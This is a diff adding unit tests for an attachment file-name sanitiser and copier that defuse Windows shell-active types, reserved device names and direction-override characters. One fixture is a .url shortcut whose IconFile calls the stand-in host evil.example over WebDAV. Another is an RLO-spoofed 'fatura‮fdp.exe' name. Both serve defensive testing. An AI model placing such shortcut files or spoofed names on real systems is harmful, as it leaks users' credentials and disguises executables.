@@ -64,6 +64,29 @@ describe('attachments: the pure rules', () => {
     assert.equal(safeFileName('.gitignore'), '.gitignore')
   })
 
+  test('RR4 M-1: what the Windows shell acts on by itself is made inert, devices by the real rule, no format character', () => {
+    // A type the shell resolves on its own (an icon fetched over SMB/WebDAV when the folder is shown) never keeps its type.
+    for (const n of ['a.url', 'b.scf', 'c.library-ms', 'd.LNK', 'e.searchConnector-ms', 'f.appref-ms', 'g.website', 'h.theme', 'i.hta', 'j.cpl', 'k.msc', 'l.pif', 'm.themepack', 'n.settingcontent-ms', 'o.url. .'])
+      assert.ok(safeFileName(n).endsWith('.download'), n)
+    assert.equal(safeFileName('a.url'), 'a.url.download')
+    assert.equal(safeFileName('Desktop.INI'), 'Desktop.INI.download')
+    assert.equal(safeFileName('autorun.inf'), 'autorun.inf.download')
+    assert.equal(safeFileName('fatura.pdf'), 'fatura.pdf')
+    // A long dangerous name keeps both its type and the suffix, within the ceiling.
+    const long = safeFileName(`${'x'.repeat(116)}.url${'y'.repeat(30)}`)
+    assert.ok(long.length <= 120 && !/\.url$/i.test(long), long)
+    const longUrl = safeFileName(`${'x'.repeat(300)}.url`)
+    assert.ok(longUrl.length <= 120 && longUrl.endsWith('.url.download'), longUrl)
+    // Reserved by Windows' own rule: the part before the first dot, trailing spaces gone, superscript digits, the console.
+    for (const n of ['con .txt', 'COM¹.txt', 'lpt³', 'CONIN$', 'conout$.log', 'nul.tar.gz', 'AUX', 'com0.x'])
+      assert.ok(safeFileName(n).startsWith('_'), n)
+    for (const n of ['console.txt', 'com10.txt', 'conin.txt', 'nulo.txt']) assert.equal(safeFileName(n), n)
+    // Format characters (RLO, zero width) go, in the app's road too.
+    assert.equal(safeFileName('fatura‮fdp.exe'), 'faturafdp.exe')
+    assert.equal(safeFileName('a​b.png'), 'ab.png')
+    assert.equal(safeFileName('‮'), 'arquivo')
+  })
+
   test('numbered names and the pasted print name', () => {
     assert.equal(numberedName('contrato-v3.pdf', 1), 'contrato-v3.pdf')
     assert.equal(numberedName('contrato-v3.pdf', 2), 'contrato-v3 (2).pdf')
@@ -126,6 +149,28 @@ describe('attachments: the daemon copier', () => {
     assert.ok(shot.ok)
     assert.equal(shot.files[0]!.name, 'Captura de tela 2026-11-24 09.41.07.png')
     assert.equal(shot.files[0]!.type, 'image/png')
+  })
+
+  test('RR4 M-1: files from afar land inert, never a device nor a format character, and carry the Internet zone (Windows)', async () => {
+    const src = join(home, 'src-afar')
+    mkdirSync(src, { recursive: true })
+    const shortcut = '[InternetShortcut]\r\nURL=https://x\r\nIconFile=\\\\evil.example@SSL\\s\\i.ico\r\nIconIndex=1\r\n'
+    const names = ['a.url', 'b.scf', 'c.library-ms', 'desktop.ini', 'con .txt', 'COM¹.txt', 'CONIN$', 'fatura‮fdp.exe']
+    const sources = names.map((name, i) => { const p = join(src, `up-${i}.ready`); writeFileSync(p, shortcut); return { path: p, name } })
+    const dir = join(home, 'channels', 'c_afar', 'files')
+    const r = await storeFiles(dir, sources, undefined, { fromAfar: true })
+    assert.ok(r.ok, JSON.stringify(r))
+    assert.deepEqual(r.files.map((f) => f.name), [
+      'a.url.download', 'b.scf.download', 'c.library-ms.download', 'desktop.ini.download', '_con .txt', '_COM¹.txt', '_CONIN$', 'faturafdp.exe',
+    ])
+    for (const f of r.files) {
+      assert.equal(readFileSync(f.path, 'utf8'), shortcut, `${f.name}: a regular file, not a device`)
+      if (process.platform === 'win32') assert.match(readFileSync(`${f.path}:Zone.Identifier`, 'utf8'), /^\[ZoneTransfer\]\r\nZoneId=3\r\n$/, f.name)
+    }
+    // The app's own copies carry no mark: the person chose them on this machine.
+    const own = await storeFiles(dir, [{ path: sources[0]!.path, name: 'nota.txt' }])
+    assert.ok(own.ok)
+    if (process.platform === 'win32') assert.equal(existsSync(`${own.files[0]!.path}:Zone.Identifier`), false)
   })
 
   const fakeDisk = (stats: Record<string, { size: number; isFile: boolean; isDirectory: boolean }>, failOn?: string): FilesDisk & { copies: string[]; removed: string[] } => {
